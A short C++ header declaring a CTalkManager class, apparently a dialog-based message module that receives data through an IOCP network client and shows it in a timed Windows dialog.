// TalkManager.h: interface for the CTalkManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_TALKMANAGER_H__BF276DAF_7D22_4C3C_BE95_709E29D5614D__INCLUDED_)
#define AFX_TALKMANAGER_H__BF276DAF_7D22_4C3C_BE95_709E29D5614D__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"

class CTalkManager : public CManager  
{
public:
	HINSTANCE m_hInstance;
	CTalkManager(IOCPClient* ClientObject, int n, void* user = nullptr);
	virtual ~CTalkManager();
	VOID  OnReceive(PBYTE szBuffer, ULONG ulLength);

	static INT_PTR CALLBACK DialogProc(HWND hDlg, UINT uMsg, 
		WPARAM wParam, LPARAM lParam);  

	VOID OnInitDialog(HWND hDlg);
	VOID OnDlgTimer(HWND hDlg);

	char g_Buffer[TALK_DLG_MAXLEN];
	UINT_PTR g_Event;
};

#endif // !defined(AFX_TALKMANAGER_H__BF276DAF_7D22_4C3C_BE95_709E29D5614D__INCLUDED_)
